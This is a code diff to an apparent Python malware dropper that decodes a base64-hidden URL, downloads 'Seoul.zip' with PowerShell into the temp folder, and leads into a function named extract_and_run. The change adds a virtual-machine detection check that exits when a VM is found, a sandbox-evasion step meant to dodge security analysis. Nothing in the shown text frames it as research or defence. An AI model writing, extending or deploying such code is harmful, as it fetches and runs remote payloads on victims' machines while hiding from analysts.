@@ -4,32 +4,40 @@ import zipfile
 import io
 import subprocess
 import tempfile
+import sys
 from urllib.parse import unquote
+from vmdetect import check_vm as checkvm
 
 destination = os.path.join(tempfile.gettempdir(), "Seoul.zip")
 
 def download_zip(url):
-    try:
-        padding = len(url) % 4
-        if padding:
-            url += "=" * (4 - padding)
+    vmdetection = checkvm()
+    
+    if vmdetection:
+        print('Virtual Machine Detected, stopping program...')
+        sys.exit(1)
+    else:
+        try:
+            padding = len(url) % 4
+            if padding:
+                url += "=" * (4 - padding)
             
-        decoded_bytes = base64.b64decode(url)
-        decoded_url = decoded_bytes.decode('utf-8')
+            decoded_bytes = base64.b64decode(url)
+            decoded_url = decoded_bytes.decode('utf-8')
         
-        clean_url = unquote(decoded_url)
+            clean_url = unquote(decoded_url)
         
-        if not clean_url.startswith(('http://', 'https://')):
-            clean_url = 'http://' + clean_url
-            
-        print(f"[*] Downloading zip file...") 
-        r = subprocess.run(['powershell', 'Invoke-WebRequest', '-Uri', clean_url, '-OutFile', destination])
-        r.check_returncode()
-        with open(destination, 'rb') as f:
-            return f.read()
-    except Exception as e:
-        print(f"[!] Download failed: {e}")
-        return None
+            if not clean_url.startswith(('http://', 'https://')):
+                clean_url = 'http://' + clean_url
+
+            print(f"[*] Downloading zip file...") 
+            r = subprocess.run(['powershell', 'Invoke-WebRequest', '-Uri', clean_url, '-OutFile', destination])
+            r.check_returncode()
+            with open(destination, 'rb') as f:
+                return f.read()
+        except Exception as e:
+            print(f"[!] Download failed: {e}")
+            return None
 
 
 def extract_and_run(zip_data, executable_name):
